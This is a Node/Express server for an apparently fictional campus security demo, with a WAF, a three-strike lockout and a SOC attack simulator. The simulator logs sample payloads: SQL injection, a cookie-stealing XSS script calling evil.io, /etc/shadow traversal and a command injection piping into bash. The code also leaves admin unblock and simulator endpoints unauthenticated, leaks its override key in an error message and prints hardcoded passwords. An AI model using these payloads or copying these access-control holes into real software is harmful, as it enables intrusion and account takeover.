/**
 * WebShield Security Suite - Core Express Application Server
 * Apex Institute of Technology & Cyber Sciences
 * 
 * Multi-Layer Perimeter WAF + IAM + IDS + SOC Telemetry Engine
 */

const express = require('express');
const path = require('path');
const helmet = require('helmet');
const cookieParser = require('cookie-parser');
const cors = require('cors');

// Internal security & data layers
const db = require('./database');
const {
  extractClientIp,
  generateCompositeFingerprint,
  rateLimiterMiddleware,
  wafInspectionMiddleware,
  checkLockoutMiddleware,
  processLoginAttempt,
  verifySessionToken,
  requireAuth,
  requireRole,
  ADMIN_OVERRIDE_KEY
} = require('./securityEngine');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: [
        "'self'",
        "'unsafe-inline'",
        "'unsafe-eval'",
        'https://cdnjs.cloudflare.com',
        'https://cdn.jsdelivr.net',
        'https://unpkg.com'
      ],
      styleSrc: [
        "'self'",
        "'unsafe-inline'",
        'https://fonts.googleapis.com',
        'https://cdnjs.cloudflare.com'
      ],
      fontSrc: [
        "'self'",
        'https://fonts.gstatic.com',
        'https://cdnjs.cloudflare.com',
        'data:'
      ],
      imgSrc: [
        "'self'",
        'data:',
        'blob:',
        'https://images.unsplash.com',
        'https://cdnjs.cloudflare.com'
      ],
      connectSrc: ["'self'", 'blob:'],
      workerSrc: ["'self'", 'blob:'],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: []
    }
  },
  crossOriginEmbedderPolicy: false
}));

app.use(cors({
  origin: true,
  credentials: true
}));

app.use(cookieParser());
app.use(express.json({ limit: '200kb' }));
app.use(express.urlencoded({ extended: true, limit: '200kb' }));

// -----------------------------------------------------------------------------
// 2. LAYER 1 & LAYER 3 INLINE GLOBAL GUARDS (WAF & RATE LIMITER)
// -----------------------------------------------------------------------------

// Client device fingerprint resolver
app.use((req, res, next) => {
  const ip = extractClientIp(req);
  const clientFpHeader = req.headers['x-webshield-fingerprint'] || req.cookies?.webshield_fp;
  const fp = generateCompositeFingerprint(req, clientFpHeader);

  req.clientIp = ip;
  req.clientFingerprint = fp;

  // Set persistent fingerprint cookie
  res.cookie('webshield_fp', fp, {
    httpOnly: false,
    sameSite: 'Strict',
    maxAge: 365 * 24 * 60 * 60 * 1000 // 1 year persistence
  });

  next();
});

// Deep Packet Inspection WAF on all incoming requests
app.use(wafInspectionMiddleware);

// Sliding-window network perimeter rate limiter on all API endpoints

app.use('/api', rateLimiterMiddleware);

// -----------------------------------------------------------------------------
// 3. STATIC ASSETS & STRICT GATEKEEPER ROUTING
// -----------------------------------------------------------------------------

// Serve public CSS, JS, and static assets freely
app.use('/css', express.static(path.join(__dirname, 'public', 'css')));
app.use('/js', express.static(path.join(__dirname, 'public', 'js')));
app.use('/assets', express.static(path.join(__dirname, 'public', 'assets')));
app.use(express.static(path.join(__dirname, 'public')));

// WebShield Security Gate (Public Landing Page)
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// MANDATORY GATEKEEPER: Internal College Portal Routes strictly require authentication
const internalPortalRoutes = ['/portal', '/academics', '/admissions', '/faculty', '/research'];
app.get(internalPortalRoutes, requireAuth, (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'portal.html'));
});

// Explicit direct access to portal.html is also guarded
app.get('/portal.html', requireAuth, (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'portal.html'));
});

// -----------------------------------------------------------------------------
// 4. AUTHENTICATION & LOCKOUT API ROUTES
// -----------------------------------------------------------------------------

/**
 * Health check & perimeter status
 */
app.get('/api/health', (req, res) => {
  res.json({
    status: 'OPERATIONAL',
    service: 'WebShield Multi-Layer Security Suite',
    institution: 'Apex Institute of Technology & Cyber Sciences',
    version: '2026.4.1',
    activeGuards: ['WAF_DEEP_INSPECTION', 'IAM_3_STRIKE_ENGINE', 'NETWORK_RATE_GATE', 'SOC_TELEMETRY']
  });
});

/**
 * Register / verify client device fingerprint
 */
app.post('/api/auth/fingerprint', (req, res) => {
  const clientHardware = req.body || {};
  const fp = generateCompositeFingerprint(req, clientHardware);

  // Check if this fingerprint is currently locked out
  const activeLockout = db.getActiveLockout(null, fp, req.clientIp);

  res.json({
    fingerprint: fp,
    ip: req.clientIp,
    isLockedOut: !!activeLockout,
    lockoutDetails: activeLockout || null
  });
});

/**
 * Query current lockout status for the client device
 */
app.get('/api/auth/lockout-status', (req, res) => {
  const username = req.query.username || null;
  const activeLockout = db.getActiveLockout(username, req.clientFingerprint, req.clientIp);

  if (activeLockout) {
    return res.status(423).json({
      locked: true,
      threatId: activeLockout.threatId,
      username: activeLockout.username,
      fingerprint: activeLockout.fingerprint,
      lockedAt: new Date(activeLockout.lockedAt).toISOString(),
      expiresAt: new Date(activeLockout.expiresAt).toISOString(),
      remainingMs: activeLockout.remainingMs,
      remainingFormatted: activeLockout.remainingFormatted,
      reason: activeLockout.reason,
      shieldState: 'CRIMSON_LOCKOUT'
    });
  }

  res.json({
    locked: false,
    remainingAttempts: 3,
    shieldState: 'CYAN_IDLE'
  });
});

/**
 * Login Endpoint with 3-Strike 24-Hour Lockout Logic
 */
app.post('/api/auth/login', checkLockoutMiddleware, async (req, res) => {
  const {
    username,
    password,
    clientFingerprint,
    challengeToken,
    challengeAnswer,
    challengeAnswerHash,
    challengeNonce
  } = req.body;

  const resolvedFp = clientFingerprint || req.clientFingerprint;

  const result = await processLoginAttempt({
    username,
    password,
    clientFingerprint: resolvedFp,
    ip: req.clientIp,
    challengeToken,
    challengeAnswer,
    challengeAnswerHash,
    challengeNonce
  });

  // If login successful, set HttpOnly SameSite=Strict cookie
  if (result.success && result.token) {
    res.cookie('webshield_session', result.token, {
      httpOnly: true,
      sameSite: 'Strict',
      secure: process.env.NODE_ENV === 'production',
      maxAge: 8 * 60 * 60 * 1000 // 8 hours
    });
  }

  return res.status(result.statusCode || 200).json(result);
});

/**
 * Logout Endpoint
 */
app.post('/api/auth/logout', (req, res) => {
  res.clearCookie('webshield_session', {
    httpOnly: true,
    sameSite: 'Strict'
  });

  db.logSecurityEvent({
    eventType: 'AUTH_LOGOUT',
    severity: 'INFO',
    ip: req.clientIp,
    fingerprint: req.clientFingerprint,
    endpoint: '/api/auth/logout',
    method: 'POST',
    ruleTriggered: 'SESSION_TERMINATION',
    actionTaken: 'COOKIE_CLEARED',
    payloadSample: 'User logged out and session revoked.'
  });

  res.json({ success: true, message: 'Session successfully revoked. WebShield disconnected.' });
});

/**
 * Verify Current Session & Profile
 */
app.get('/api/auth/me', (req, res) => {
  const token = req.cookies?.webshield_session ||
                (req.headers.authorization && req.headers.authorization.startsWith('Bearer ')
                  ? req.headers.authorization.substring(7)
                  : null);

  const decoded = verifySessionToken(token);

  if (!decoded) {
    return res.status(401).json({ authenticated: false });
  }

  const user = db.getUserById(decoded.sub);
  if (!user) {
    return res.status(401).json({ authenticated: false });
  }

  res.json({
    authenticated: true,
    user: {
      id: user.id,
      email: user.email,
      name: user.name,
      role: user.role,
      department: user.department,
      clearanceLevel: user.clearanceLevel,
      avatar: user.avatar,
      enrolledCourses: user.enrolledCourses || null,
      assignedLabs: user.assignedLabs || null,
      adminPrivileges: user.adminPrivileges || null
    }
  });
});

// -----------------------------------------------------------------------------
// 5. EVALUATOR SOC CONTROLS & LIVE ATTACK SIMULATION MODE
// -----------------------------------------------------------------------------

/**
 * Admin Override / Evaluator Demo Fast-Forward Key
 * Clears the 24-hour lockout immediately using key 'SOC-RESET-2026'
 */
app.post('/api/soc/override', (req, res) => {
  const { overrideKey, targetUsername, targetThreatId, unlockAll } = req.body;

  if (overrideKey !== ADMIN_OVERRIDE_KEY) {
    db.logSecurityEvent({
      eventType: 'SOC_OVERRIDE_UNAUTHORIZED',
      severity: 'CRITICAL',
      ip: req.clientIp,
      fingerprint: req.clientFingerprint,
      endpoint: '/api/soc/override',
      method: 'POST',
      ruleTriggered: 'ADMIN_OVERRIDE_AUTH_FAIL',
      actionTaken: 'BLOCKED_403',
      payloadSample: `Invalid override key attempt: '${(overrideKey || '').substring(0, 20)}'`
    });

    return res.status(403).json({
      error: 'Invalid SOC Override Key. Access denied.',
      requiredKeyHint: 'Use the presentation fast-forward key: SOC-RESET-2026'
    });
  }

  const result = db.overrideLockouts({
    threatId: targetThreatId,
    username: targetUsername,
    overrideAll: unlockAll === true || (!targetUsername && !targetThreatId),
    adminEmail: 'evaluator.soc@apex.edu'
  });

  res.json({
    success: true,
    message: `SOC Master Override Applied: ${result.affectedCount} lockout(s) reset.`,
    affectedCount: result.affectedCount,
    shieldState: 'CYAN_IDLE'
  });
});

/**
 * Live Attack Simulator Endpoint
 * Enables evaluators to trigger real-time intrusion events and inspect WAF/IDS deflection
 */
app.post(['/api/admin/simulate-attack', '/api/soc/simulate-attack'], (req, res) => {
  const { attackType, customPayload } = req.body;
  const ip = req.clientIp;
  const fp = req.clientFingerprint;

  let simulatedEvent;

  switch (attackType) {
    case 'SQLI': {
      db.incrementMetric('sqliDeflected');
      db.incrementMetric('totalThreatsBlocked');
      simulatedEvent = db.logSecurityEvent({
        eventType: 'INTRUSION_DETECTED_SQL_INJECTION',
        severity: 'CRITICAL',
        ip,
        fingerprint: fp,
        endpoint: '/api/portal/academics?filter=' + encodeURIComponent(customPayload || "' UNION SELECT * FROM users--"),
        method: 'GET',
        ruleTriggered: 'SQLi_Union_Select',
        actionTaken: 'INSTANT_INTRUSION_BLOCK_403',
        payloadSample: customPayload || "' UNION SELECT id, email, passwordHash FROM users--",
        threatId: `THREAT-SQLI-${Date.now().toString().slice(-4)}`
      });
      break;
    }

    case 'XSS': {
      db.incrementMetric('xssDeflected');
      db.incrementMetric('totalThreatsBlocked');
      simulatedEvent = db.logSecurityEvent({
        eventType: 'INTRUSION_DETECTED_XSS_ATTACK',
        severity: 'HIGH',
        ip,
        fingerprint: fp,
        endpoint: '/api/admissions/apply',
        method: 'POST',
        ruleTriggered: 'XSS_Explicit_Script_Tag',
        actionTaken: 'INSTANT_INTRUSION_BLOCK_403',
        payloadSample: customPayload || "<script>fetch('https://evil.io/steal?c='+document.cookie)</script>",
        threatId: `THREAT-XSS-${Date.now().toString().slice(-4)}`
      });
      break;
    }

    case 'PATH_TRAVERSAL': {
      db.incrementMetric('traversalDeflected');
      db.incrementMetric('totalThreatsBlocked');
      simulatedEvent = db.logSecurityEvent({
        eventType: 'INTRUSION_DETECTED_PATH_TRAVERSAL',
        severity: 'CRITICAL',
        ip,
        fingerprint: fp,
        endpoint: '/api/research/download?file=../../../../etc/shadow',
        method: 'GET',
        ruleTriggered: 'Path_Directory_Traversal',
        actionTaken: 'INSTANT_INTRUSION_BLOCK_403',
        payloadSample: customPayload || '../../../../etc/shadow',
        threatId: `THREAT-PATH-${Date.now().toString().slice(-4)}`
      });
      break;
    }

    case 'COMMAND_INJECTION': {
      db.incrementMetric('traversalDeflected');
      db.incrementMetric('totalThreatsBlocked');
      simulatedEvent = db.logSecurityEvent({
        eventType: 'INTRUSION_DETECTED_COMMAND_INJECTION',
        severity: 'CRITICAL',
        ip,
        fingerprint: fp,
        endpoint: '/api/systems/ping',
        method: 'POST',
        ruleTriggered: 'Cmd_Shell_Chaining',
        actionTaken: 'INSTANT_INTRUSION_BLOCK_403',
        payloadSample: customPayload || '127.0.0.1 && cat /etc/passwd | bash',
        threatId: `THREAT-CMD-${Date.now().toString().slice(-4)}`
      });
      break;
    }

    case 'BRUTE_FORCE_TRIGGER': {
      // Simulate 3 rapid credential failures to immediately trigger 24h lockout
      const testUser = 'student@apex.edu';
      db.recordFailedAttempt(testUser, fp, ip);
      db.recordFailedAttempt(testUser, fp, ip);
      const lockout = db.recordLockout(
        testUser,
        fp,
        ip,
        'Live Attack Simulator: Simulated 3-Strike Brute Force Intrusion'
      );

      return res.status(423).json({
        success: false,
        message: 'Simulated 3-strike brute force executed. 24-Hour Lockout active!',
        lockoutData: lockout
      });
    }

    default:
      return res.status(400).json({ error: 'Unknown simulated attack type' });
  }

  res.json({
    success: true,
    attackType,
    simulatedEvent,
    shieldDeflection: true,
    message: 'Attack vector intercepted and forensic incident logged.'
  });
});

/**
 * Admin / SOC Security Telemetry & System State
 * Powers the live Security Operations Center (SOC) Drawer
 */
app.get(['/api/admin/telemetry', '/api/soc/telemetry'], (req, res) => {
  const metrics = db.getMetrics();
  const allLockouts = db.getAllLockouts();
  const activeLockouts = allLockouts.filter(l => l.status === 'ACTIVE');
  const logsResult = db.getSecurityLogs(60, 0);

  // Compile active blocked entities and IPs
  const ipMap = {};
  for (const l of activeLockouts) {
    if (!ipMap[l.ip]) {
      ipMap[l.ip] = {
        ip: l.ip,
        username: l.username,
        threatId: l.threatId,
        lockedAt: new Date(l.lockedAt).toISOString(),
        expiresAt: new Date(l.expiresAt).toISOString(),
        remainingMs: l.remainingMs,
        remainingFormatted: l.remainingFormatted,
        reason: l.reason,
        status: '24H_LOCKED',
        severity: 'CRITICAL'
      };
    }
  }

  // Also collect high/critical intrusion origins from recent WAF deflections
  for (const log of logsResult.logs) {
    if ((log.severity === 'CRITICAL' || log.severity === 'HIGH') && !ipMap[log.ip]) {
      ipMap[log.ip] = {
        ip: log.ip,
        username: log.username || 'Unauthenticated',
        threatId: log.threatId || 'WAF-INTERCEPT',
        lockedAt: log.timestamp,
        expiresAt: null,
        remainingMs: 0,
        remainingFormatted: 'DEFLECTED',
        reason: log.ruleTriggered || log.eventType,
        status: 'WAF_DEFLECTED',
        severity: log.severity
      };
    }
  }

  const blockedIps = Object.values(ipMap);

  res.json({
    metrics,
    activeLockouts,
    lockedAccounts: activeLockouts,
    blockedIps,
    recentWafLogs: logsResult.logs,
    systemDefcon: activeLockouts.length > 0 ? 'DEFCON 2 - ELEVATED PERIMETER RESTRICTION' : 'DEFCON 5 - NORMAL SECURE OPERATIONS',
    activeGuards: ['WAF_DEEP_PACKET_IDS', 'IAM_3_STRIKE_LOCKOUT', 'PERIMETER_RATE_LIMITER', 'QUANTUM_ENCRYPTED_MESH'],
    timestamp: new Date().toISOString()
  });
});

/**
 * One-Click Admin Unblock Endpoint
 */
app.post(['/api/admin/unblock', '/api/soc/unblock'], (req, res) => {
  const { threatId, username, ip, overrideAll } = req.body;
  const adminEmail = req.user ? req.user.email : 'evaluator.soc@apex.edu';

  const result = db.overrideLockouts({
    threatId,
    username,
    ip,
    overrideAll: overrideAll === true,
    adminEmail
  });

  res.json({
    success: true,
    message: result.affectedCount > 0 
      ? `Successfully unblocked ${result.affectedCount} entity/entities.`
      : 'No active matching lockout found (entity may already be unblocked or expired).',
    affectedCount: result.affectedCount,
    threatId,
    username,
    ip
  });
});

/**
 * Query Forensic Audit Logs
 */
app.get('/api/soc/logs', (req, res) => {
  const limit = parseInt(req.query.limit, 10) || 50;
  const offset = parseInt(req.query.offset, 10) || 0;
  const severity = req.query.severity || null;

  const logs = db.getSecurityLogs(limit, offset, severity);
  res.json(logs);
});

/**
 * Real-Time SOC Event Stream (Server-Sent Events)
 */
app.get('/api/soc/stream', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();

  // Send initial telemetry handshake
  const initialData = {
    eventType: 'SOC_STREAM_CONNECTED',
    severity: 'INFO',
    timestamp: new Date().toISOString(),
    message: 'Connected to WebShield Real-Time SOC Forensic Telemetry Bus'
  };
  res.write(`data: ${JSON.stringify(initialData)}\n\n`);

  // Register client to pub-sub bus
  db.registerSocSubscriber(res);

  // Heartbeat to keep connection alive
  const heartbeat = setInterval(() => {
    res.write(': heartbeat\n\n');
  }, 15000);

  req.on('close', () => {
    clearInterval(heartbeat);
    db.removeSocSubscriber(res);
  });
});

// -----------------------------------------------------------------------------
// 6. PROTECTED INTERNAL CAMPUS PORTAL DATA APIS
// -----------------------------------------------------------------------------

/**
 * Campus Dashboard Summary Data
 */
app.get('/api/portal/dashboard', requireAuth, (req, res) => {
  res.json({
    instituteName: 'Apex Institute of Technology & Cyber Sciences',
    motto: 'Sovereignty Through Cryptographic Truth',
    established: 2042,
    campusStatus: 'DEFCON 5 - NORMAL SECURE OPERATIONS',
    activeResearchers: 1420,
    quantumNodesOnline: 64,
    userProfile: req.user,
    announcements: [
      {
        id: 'ANN-01',
        title: 'Quantum Key Distribution (QKD) Mesh Upgrade',
        date: '2026-11-15',
        priority: 'CRITICAL',
        snippet: 'Building Gamma photonic links upgraded to 100 Gbps quantum entangled channels.'
      },
      {
        id: 'ANN-02',
        title: 'Cyber Defense Competition Finals Announced',
        date: '2026-11-18',
        priority: 'HIGH',
        snippet: 'Apex Red Team vs Sovereign Cyber Task Force scheduled for Dec 01.'
      }
    ]
  });
});

/**
 * Protected Academics & Degree Programs Data
 */
app.get('/api/portal/academics', requireAuth, (req, res) => {
  res.json({
    departments: [
      {
        code: 'CYB',
        name: 'Autonomous Cyber Defense & Offensive Security',
        chair: 'Dr. Marcus Vance',
        labs: 12,
        degrees: ['B.S. Cyber Warfare & Defense', 'M.S. Zero-Trust Security Architectures'],
        specialties: ['Malware Reverse Engineering', 'Kernel Exploitation', 'Firmware Auditing']
      },
      {
        code: 'QNT',
        name: 'Quantum Information Science & Cryptography',
        chair: 'Dr. Evelyn Vance',
        labs: 8,
        degrees: ['M.S. Post-Quantum Cryptography', 'Ph.D. Entangled Quantum Communication'],
        specialties: ['Lattice Cryptography', 'QKD Protocols', 'Shor Algorithm Countermeasures']
      },
      {
        code: 'AIR',
        name: 'Artificial Intelligence & Neural Security',
        chair: 'Dr. Chen Wei',
        labs: 14,
        degrees: ['B.S. AI Systems Engineering', 'M.S. Adversarial Machine Learning'],
        specialties: ['Adversarial Robustness', 'Autonomous Swarm Defense', 'LLM Jailbreak Prevention']
      },
      {
        code: 'CLD',
        name: 'Distributed Cloud & Edge Infrastructure',
        chair: 'Prof. Sarah Jenkins',
        labs: 9,
        degrees: ['B.S. Cloud Infrastructure Security', 'M.S. High-Performance Distributed Systems'],
        specialties: ['eBPF Observability', 'Confidential Computing', 'MicroVM Sandboxing']
      }
    ]
  });
});

/**
 * Protected Faculty Directory
 */
app.get('/api/portal/faculty', requireAuth, (req, res) => {
  res.json({
    facultyList: [
      {
        name: 'Dr. Evelyn Vance',
        title: 'Professor of Post-Quantum Cryptography & Chair of QNT',
        email: 'faculty@apex.edu',
        clearance: 'Level 3 - Research Lead',
        publications: 47,
        activeGrants: '$4.2M DARPA Post-Quantum Transition Grant'
      },
      {
        name: 'Dr. Marcus Vance',
        title: 'Executive Director of Threat Intelligence & SOC Commander',
        email: 'admin@apex.edu',
        clearance: 'Level 5 - Sovereign Administrator',
        publications: 39,
        activeGrants: '$8.5M Global Infrastructure Defense Initiative'
      },
      {
        name: 'Dr. Alistair Sterling',
        title: 'Associate Professor of Kernel Security & Hardware Vulnerabilities',
        email: 'a.sterling@apex.edu',
        clearance: 'Level 2 - Faculty Academic',
        publications: 22,
        activeGrants: '$1.8M Side-Channel Resistance Project'
      }
    ]
  });
});

/**
 * Protected Classified Research Telemetry
 */
app.get('/api/portal/research', requireAuth, (req, res) => {
  res.json({
    researchLabs: [
      {
        labId: 'LAB-SIGMA-9',
        name: 'Quantum Entanglement Transmission Vault',
        securityLevel: 'RESTRICTED - LEVEL 3+',
        status: 'ACTIVE_EXPERIMENT',
        currentThroughput: '10.4 Gbit/s photon stream',
        focalPoint: 'Post-Quantum Secure Key Exchange over Atmospheric Satellite Downlink'
      },
      {
        labId: 'LAB-DELTA-4',
        name: 'Adversarial Neural Swarm Testing Range',
        securityLevel: 'RESTRICTED - LEVEL 3+',
        status: 'MONITORED_SIMULATION',
        currentThroughput: '1,000 agents in adversarial sandbox',
        focalPoint: 'Zero-Day Model Poisoning Detection with eBPF Kernel Probes'
      }
    ]
  });
});

// -----------------------------------------------------------------------------
// 7. CENTRALIZED ERROR HANDLERS & 404
// -----------------------------------------------------------------------------

// 404 Handler
app.use((req, res) => {
  if (req.accepts('html')) {
    return res.redirect('/?denied=not_found');
  }
  res.status(404).json({ error: 'Endpoint Not Found on WebShield Protected Host', path: req.url });
});

// Centralized 500 Error Handler
app.use((err, req, res, next) => {
  console.error('[WebShield-Unhandled-Exception]', err);

  db.logSecurityEvent({
    eventType: 'UNHANDLED_SERVER_EXCEPTION',
    severity: 'HIGH',
    ip: req.clientIp || '127.0.0.1',
    fingerprint: req.clientFingerprint || 'unknown-fp',
    endpoint: req.originalUrl,
    method: req.method,
    ruleTriggered: 'EXCEPTION_SHIELD_FALLBACK',
    actionTaken: 'INTERNAL_ERROR_SUPPRESSED',
    payloadSample: `Error: ${err.message}`
  });

  res.status(500).json({
    error: 'Internal Security Exception Intercepted',
    shieldState: 'CRIMSON_LOCKOUT',
    incidentLogged: true
  });
});

// Start Server
if (require.main === module) {
  
app.post('/api/override', (req,res,next)=>{ req.url='/api/admin/unlock'; next(); });
app.listen(PORT, () => {
    console.log('================================================================');
    console.log('   WEBSHIELD: MULTI-LAYER ACCESS & INTRUSION PROTECTION SYSTEM  ');
    console.log('   Apex Institute of Technology & Cyber Sciences (Port ' + PORT + ')  ');
    console.log('================================================================');
    console.log(' [L1] Network Perimeter & 30 req/min Sliding-Window Active');
    console.log(' [L2] IAM 3-Strike 24-Hour Lockout Engine Initialized');
    console.log(' [L3] Deep Packet Inspection (WAF & IDS) Active');
    console.log(' [L4] Session Hardening & Gatekeeper Enforced');
    console.log('----------------------------------------------------------------');
    console.log(' Pre-Seeded Demonstration Accounts:');
    console.log('   - Student:  student@apex.edu  / Apex@2026');
    console.log('   - Faculty:  faculty@apex.edu  / CyberProf#99');
    console.log('   - SOC Admin: admin@apex.edu   / ShieldMaster!01');
    console.log(' Demo Fast-Forward Key: SOC-RESET-2026');
    console.log(' WebShield Gate: http://localhost:' + PORT);
    console.log('================================================================');
  });
}

module.exports = app;






